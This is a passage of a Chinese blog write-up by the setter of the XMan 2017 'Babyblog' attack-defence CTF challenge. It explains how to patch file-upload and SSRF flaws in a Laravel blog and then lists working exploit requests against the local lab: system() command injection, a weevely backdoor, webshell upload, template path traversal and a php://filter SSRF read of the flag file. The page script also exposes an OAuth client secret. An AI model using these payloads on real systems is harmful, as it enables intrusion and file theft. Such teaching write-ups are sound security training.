class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$post</span> = Post::findOrFail(<span class="variable">$id</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;authorOrAdminPermissioinRequire(<span class="variable">$post</span>-&gt;user_id);</span><br><span class="line">    <span class="variable">$validator</span> = Validator::make(<span class="variable">$data</span> = Input::all(), Post::<span class="variable">$rules</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$validator</span>-&gt;fails())</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="keyword">return</span> Redirect::back()-&gt;withErrors(<span class="variable">$validator</span>)-&gt;withInput();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$data</span>[<span class="string">&#x27;body&#x27;</span>] = Purifier::clean(<span class="variable">$data</span>[<span class="string">&#x27;body&#x27;</span>], <span class="string">&#x27;ugc_body&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$post</span>-&gt;update(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$post</span>-&gt;retag(Input::get(<span class="string">&#x27;tags&#x27;</span>));</span><br><span class="line">    </span><br><span class="line">    Flash::success(lang(<span class="string">&#x27;Operation succeeded.&#x27;</span>));</span><br><span class="line">    <span class="keyword">return</span> Redirect::route(<span class="string">&#x27;posts.show&#x27;</span>, <span class="variable">$post</span>-&gt;id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这两个函数中，对<code>$data[&#39;template&#39;]</code>提供的文件名进行正则匹配过滤即可。</p>
+<h3 id="任意文件上传-1"><a href="#任意文件上传-1" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p>可以通过grep或find等命令搜索相关关键字（如<code>upload, $_FILES, move_uploaded_file, move</code>）等，来快速定位相关位置，随后对源码进行审查。这类漏洞一般比较容易进行审查，相关关键词即可大致定位可能出现问题的位置。由于这类函数用途很多，因此审计难度也相对较大。建议从业务逻辑入手对相关代码进行审计。由于这类问题会影响程序运行逻辑，因此需要选手理解题意，根据题目的业务逻辑修复代码或添加防御措施。</p>
+<p>在本题中，容易发现博客文章图片上传功能未对文件类型进行过滤，我们需要修改相关代码，过滤掉可能导致上传木马文件的扩展名。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. app/controllers/PostsController.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uploadImage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;Failed!&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;file_path&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span> = Input::file(<span class="string">&#x27;upload_file&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fileName</span>        = <span class="variable">$file</span>-&gt;getClientOriginalName();</span><br><span class="line">        <span class="variable">$extension</span>       = <span class="variable">$file</span>-&gt;getClientOriginalExtension() ?: <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">        <span class="variable">$folderName</span>      = <span class="string">&#x27;/uploads/images/&#x27;</span> . date(<span class="string">&quot;Ym&quot;</span>, time()) .<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;d&quot;</span>, time()) .<span class="string">&#x27;/&#x27;</span>. Auth::user()-&gt;id;</span><br><span class="line">        <span class="variable">$destinationPath</span> = public_path() . <span class="variable">$folderName</span>;</span><br><span class="line">        <span class="variable">$safeName</span>        = str_random(<span class="number">10</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$extension</span>;</span><br><span class="line">        <span class="variable">$file</span>-&gt;move(<span class="variable">$destinationPath</span>, <span class="variable">$safeName</span>);</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;file_path&#x27;</span>] = <span class="variable">$folderName</span> .<span class="string">&#x27;/&#x27;</span>. <span class="variable">$safeName</span>;</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Succeeded!&quot;</span>;</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以简单的过滤<code>$safeName</code>中是否包含<code>&#39;php&#39;</code>等可作为脚本运行的文件扩展名字符串，发现问题直接返回错误即可。</p>
+<h3 id="服务端请求伪造-1"><a href="#服务端请求伪造-1" class="headerlink" title="服务端请求伪造"></a>服务端请求伪造</h3><p>可以通过grep或find等命令搜索相关关键字（如file_get_content, curl）等，来快速定位相关位置，随后对源码进行审查。但由于这类函数用途很多，因此审计难度也相对较大。建议从业务逻辑入手对相关代码进行审计。由于这类问题会影响程序运行逻辑，因此需要选手理解题意，根据题目的业务逻辑修复代码或添加防御措施。</p>
+<p>在本题中，此漏洞并不存在前端调用，因此只能对代码进行审计。可以发现在<code>/resolve_file</code>请求对应的处理函数中存在此类情况。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. app/controllers/PostsController.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">resolveImage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$resp</span> = [</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;Failed!&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;file_path&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = Input::only(<span class="string">&#x27;resolve_file&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$content</span> = @file_get_contents(<span class="variable">$data</span>[<span class="string">&#x27;resolve_file&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$content</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$extension</span>       = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">        <span class="variable">$folderName</span>      = <span class="string">&#x27;/uploads/images/&#x27;</span> . date(<span class="string">&quot;Ym&quot;</span>, time()) .<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;d&quot;</span>, time()) .<span class="string">&#x27;/&#x27;</span>. Auth::user()-&gt;id;</span><br><span class="line">        <span class="variable">$destinationPath</span> = public_path() . <span class="variable">$folderName</span>;</span><br><span class="line">        <span class="variable">$safeName</span>        = str_random(<span class="number">10</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$extension</span>;</span><br><span class="line">        @mkdir(<span class="variable">$destinationPath</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">        @file_put_contents(<span class="variable">$destinationPath</span> .<span class="string">&#x27;/&#x27;</span>. <span class="variable">$safeName</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="variable">$resp</span>[<span class="string">&#x27;file_path&#x27;</span>] = <span class="variable">$folderName</span> .<span class="string">&#x27;/&#x27;</span>. <span class="variable">$safeName</span>;</span><br><span class="line">        <span class="variable">$resp</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Succeeded!&quot;</span>;</span><br><span class="line">        <span class="variable">$resp</span>[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$resp</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现这里<code>file_get_contents</code>直接传入了请求参数，而未对其做过滤，因此可能导致任意文件读取。这里可以通过检查<code>$data[&#39;resolve_file&#39;]</code>的开头是否为<code>&#39;http&#39;</code>并且对<code>&#39;localhost&#39;</code>, <code>&#39;127.*.*.*&#39;</code>等相关的内网域名、IP等进行过滤。</p>
+<h2 id="0x02-漏洞利用方式"><a href="#0x02-漏洞利用方式" class="headerlink" title="0x02 漏洞利用方式"></a>0x02 漏洞利用方式</h2><h3 id="1-index"><a href="#1-index" class="headerlink" title="1. index"></a>1. index</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET http:&#x2F;&#x2F;localhost:21000&#x2F;?method&#x3D;assert HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:21000</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Referer: system(&#39;cat &#x2F;home&#x2F;web&#x2F;flag&#x2F;flag&#39;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-404"><a href="#2-404" class="headerlink" title="2. 404"></a>2. 404</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST http:&#x2F;&#x2F;localhost:21000&#x2F;asdadasdaasd HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:21000</span><br><span class="line">Content-Length: 27</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">notfound&#x3D;system(&quot;cat%20%2Fhome%2Fweb%2Fflag%2Fflag&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>在比赛现场由于部署时使用了php7, preg_match的r选项已无法使用，因此该漏洞失效。</p>
+<h3 id="3-upload-image"><a href="#3-upload-image" class="headerlink" title="3. upload_image"></a>3. upload_image</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;upload_image</span><br></pre></td></tr></table></figure>
+
+<p>直接上传一句话木马，随后通过一句话木马利用。</p>
+<h3 id="4-weevely-in-autoload-real-php"><a href="#4-weevely-in-autoload-real-php" class="headerlink" title="4. weevely in autoload_real.php"></a>4. weevely in autoload_real.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ weevely http:&#x2F;&#x2F;ip:port&#x2F;any xman1234</span><br></pre></td></tr></table></figure>
+
+<p>随后通过weevely直接读flag</p>
+<h3 id="5-Post-checker-shellcmd-in-autoload-php"><a href="#5-Post-checker-shellcmd-in-autoload-php" class="headerlink" title="5. Post checker=shellcmd in autoload.php"></a>5. Post checker=shellcmd in autoload.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST http:&#x2F;&#x2F;localhost:21000&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:21000</span><br><span class="line">Content-Length: 41</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">checker&#x3D;cat%20%2Fhome%2Fweb%2Fflag%2Fflag</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-template-any-file-require"><a href="#6-template-any-file-require" class="headerlink" title="6. template any file require"></a>6. template any file require</h3><p><code>http://localhost:21000/posts/create</code>在发布文章时修改提交的模板值</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">name</span>=<span class="string">&quot;template&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;/../../../../../../home/web/flag/flag&quot;</span>&gt;</span>Template 1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2.tpl&quot;</span>&gt;</span>Template 2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;3.tpl&quot;</span>&gt;</span>Template 3<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>随后新发布的文章中就会包含flag的值</p>
+<h3 id="7-resolve-file-SSRF"><a href="#7-resolve-file-SSRF" class="headerlink" title="7. resolve_file SSRF"></a>7. resolve_file SSRF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST http:&#x2F;&#x2F;localhost:21000&#x2F;resolve_image HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:21000</span><br><span class="line">Content-Length: 112</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Cookie: laravel_session&#x3D;eyJpdiI6ImN0alBVaUVmSWhDKzlpVXhybGVPZXc9PSIsInZhbHVlIjoianU3Ym9CcXFOeVN4bW5nS0k2MWxcL25Ed0FBN2s5VFg5SFlxRGl5eW12b1J4bkpSTFl3QzR3d0l4bUtvTzhMNklEQndEdlRDMVF0UmtSTllnVlNOaUR3PT0iLCJtYWMiOiJjNWNiNmMyODNjYmU1MGUyYTE0OWY0ZTMxMGQ4ZTRmM2Q2MDRhMDBjOWJmNTU4MGJjMDY1NGRkNzdjNDJhYjYwIn0%3D</span><br><span class="line"></span><br><span class="line">resolve_file&#x3D;php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;web&#x2F;flag&#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<p>随后根据返回的json文件中file_path的值下载文件后base64解码即为flag</p>
+<p>&nbsp;</p>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>这次出题难度属于较为简单的，考察的也是最基础的一些常见web注入点。但由于时间关系和比赛性质，没有对XSS，CSRF，SQL注入等知识点进行考察，且所有的漏洞点均为可直接利用，没有需要二次利用的漏洞。以后可能会尝试出一些和密码学/misc/pwn相结合的web攻防题。最后也恭喜在这次夏令营中取得优异成绩的各位大师傅！</p>
+
+<div id="gitalk-container"></div>
+<script src="//cdn.jsdelivr.net/npm/blueimp-md5@2.18.0/js/md5.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css"><script src="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
+
+        <script>
+        var post_title = "XMan2017夏令营结业攻防赛Babyblog出题思路 & WriteUP";
+        var gitalkConfig = {"enable":true,"clientID":"c52007e74a2d1a984cf2","clientSecret":"7b7b53b4b0bb4bb59c137824b316b351d2305edc","repo":"summershrimp.github.io","owner":"summershrimp","admin":["summershrimp"],"labels":["gitalk"],"perPage":10,"pagerDirection":"last","createIssueManually":true,"distractionFreeMode":false,"proxy":"https://cors.xm1994.workers.dev/?https://github.com/login/oauth/access_token"};
+        gitalkConfig.id = md5(post_title);
+        var gitalk = new Gitalk(gitalkConfig);
+        gitalk.render("gitalk-container");
+        </script>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://www.summershrimp.com/2017/08/xman2017-awd-babyblog-writeup/" data-id="ckm63pzc4001lnpp3awjve6mk" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/05/xinetd-kafel/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          xinetd-kafel - 一个更安全的xinetd服务
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/08/appium-android-ui-test/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Appium在Android UI测试中的应用</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/App/">App</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/App/%E5%AE%89%E5%85%A8%E5%90%91/">安全向</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Fun/">Fun</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Fun/%E5%BC%80%E5%8F%91%E5%90%91/">开发向</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Server-Side/">Server-Side</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Server-Side/Windows-Linux/">Windows/Linux</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web-Backend/">Web Backend</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%90%90%E5%98%88/">吐嘈</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%90%90%E5%98%88/%E6%97%A5%E5%B8%B8/">日常</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%97%A5%E5%B8%B8/">日常</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/">未分类</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B/">社会工程</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Apache/" rel="tag">Apache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CGI/" rel="tag">CGI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WriteUP/" rel="tag">WriteUP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%B0%E5%BC%80%E5%A7%8B/" rel="tag">新开始</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%97%A5%E5%B8%B8/" rel="tag">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" rel="tag">服务器</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Apache/" style="font-size: 10px;">Apache</a> <a href="/tags/CGI/" style="font-size: 10px;">CGI</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/WriteUP/" style="font-size: 10px;">WriteUP</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 10px;">安全</a> <a href="/tags/%E6%96%B0%E5%BC%80%E5%A7%8B/" style="font-size: 10px;">新开始</a> <a href="/tags/%E6%97%A5%E5%B8%B8/" style="font-size: 10px;">日常</a> <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="font-size: 10px;">服务器</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">April 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/02/">February 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/01/">January 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/12/">December 2014</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/03/HWS2021%E5%86%B3%E8%B5%9BWriteUp/">HWS2021决赛WriteUp</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/run-multi-service-in-one-container/">如何科学的在Docker Container中运行多个服务</a>
+          </li>
+        
+          <li>
+            <a href="/2018/05/xinetd-kafel/">xinetd-kafel - 一个更安全的xinetd服务</a>
+          </li>
+        
+          <li>
+            <a href="/2017/08/xman2017-awd-babyblog-writeup/">XMan2017夏令营结业攻防赛Babyblog出题思路 &amp; WriteUP</a>
+          </li>
+        
+          <li>
+            <a href="/2016/08/appium-android-ui-test/">Appium在Android UI测试中的应用</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 Yibai Zhang<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
